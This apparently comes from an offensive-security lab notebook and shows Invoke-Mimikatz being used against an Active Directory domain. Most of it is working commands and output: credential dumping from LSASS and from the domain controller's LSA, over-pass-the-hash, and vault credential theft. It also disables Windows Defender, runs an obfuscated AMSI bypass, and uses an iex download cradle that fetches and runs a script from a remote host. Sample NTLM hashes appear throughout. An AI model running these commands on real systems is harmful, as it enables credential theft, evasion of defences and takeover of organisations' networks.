
Invoke-Mimikatz can be used to dump creds, tickets and more using mimikatz with PowerShell without dropping the mimikatz exe to disk
Very useful for passing and replaying hashes, tickets and for many exciting AD attacks

Using the code from ReflectivePEInjection, mimikatz is loaded reflictively into memory. All functions of mimikatz can be used from this script.
The script needs admininistrative privs for dumping credentials from local machines. Many attacks needs specific privileges which are covered while discussing that attack

```powershell
#Dump credentials on a local machine.
Invoke-Mimikatz -DumpCreds

#Dump credentials on multiple remote machines.
Invoke-Mimikatz -DumpCreds -ComputerName@("sys1","sys2")  
#Invoke-Mimikatz uses PowerShell remoting cmdlet Invoke-Command to do above. 

#"Over pass the hash" generate tokens from hashes.
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:abc.example.local /ntlm:<ntlmhash> /run:powershell.exe"'
```


## Logon Password Remotely

If ps remoting is available invoke mimikatz can be run by setting up a session

```powershell
PS C:\Program Files (x86)\Jenkins\workspace\project0> $sess = New-PSSession -ComputerName mgmt.abc.example.local
PS C:\Program Files (x86)\Jenkins\workspace\project0> Invoke-Command {Set-MpPreference -DisableIOAVProtection $true} -Session $sess
PS C:\Program Files (x86)\Jenkins\workspace\project0> iex((new-object net.webclient).downloadstring('http://172.16.99.30/Invoke-Mimikatz.ps1'))
PS C:\Program Files (x86)\Jenkins\workspace\project0> Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 139144 (00000000:00021f88)
Session           : Service from 0
User Name         : svcadmin
Domain            : example
Logon Server      : DC
Logon Time        : 1/31/2022 2:51:47 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-1122
	msv :	
	 [00000003] Primary
	 * Username : svcadmin
	 * Domain   : example
	 * NTLM     : b38ff50264b74508085d82c69794a4d8
	 * SHA1     : a4ad2cd4082079861214297e1cae954c906501b9
	 * DPAPI    : fd3c6842994af6bd69814effeedc55d3
```


## Over-Pass-The-Hash
After running invoke-mimikatz, a new powershell session will spawn. This will be the same as the current user but have the privileges of whoever's hash is passed here, in this case a domain admin

This creates a full TGT based on which users hash has been obtained

```powershell
PS C:\AD\Tools> Set-MpPreference -DisableRealtimeMonitoring $true

PS C:\AD\Tools> Set-ExecutionPolicy bypass

PS C:\AD\Tools> . .\Invoke-Mimikatz.ps1

PS C:\AD\Tools> Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:abc.example.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::pth /user:svcadmin /domain:abc.example.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe
user	: svcadmin
domain	: abc.example.local
program	: powershell.exe
impers.	: no
NTLM	: b38ff50264b74508085d82c69794a4d8
  |  PID  2100
  |  TID  4052
  |  LSA Process is now R/W
  |  LUID 0 ; 73226316 (00000000:045d584c)
  \_ msv1_0   - data copy @ 0000021A905E4FC0 : OK !
  \_ kerberos - data copy @ 0000021A91069E68
   \_ aes256_hmac       -> null             
   \_ aes128_hmac       -> null             
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 0000021A9117E608 (32) -> null
```


## Load Mimikatz Remotely

Requires PSRemoting

```powershell
PS C:\Windows\system32> $sess = New-PSSession dc.abc.example.local
PS C:\Windows\system32> Enter-PSSession $sess
[dc.abc.example.local]: PS C:\Users\svcadmin\Documents> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + (
'uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6
}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) ).
"g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'
+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
[dc.abc.example.local]: PS C:\Users\svcadmin\Documents> exit

PS C:\ad\tools> Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
PS C:\ad\tools> Enter-PSSession $sess
[dc.abc.example.local]: PS C:\Users\svcadmin\Documents> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # lsadump::lsa /patch
Domain : example / S-1-5-21-1874506631-3219952063-538504511

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : af0686cc0ca8f04df42210c9ac980760

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : ff46a9d8bd66c6efd77603da26796f35

RID  : 000001f7 (503)
User : DefaultAccount
LM   :
NTLM :
```

## Extract Credentials From Credential Vault (Scheduled Tasks)

```powershell
Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
```
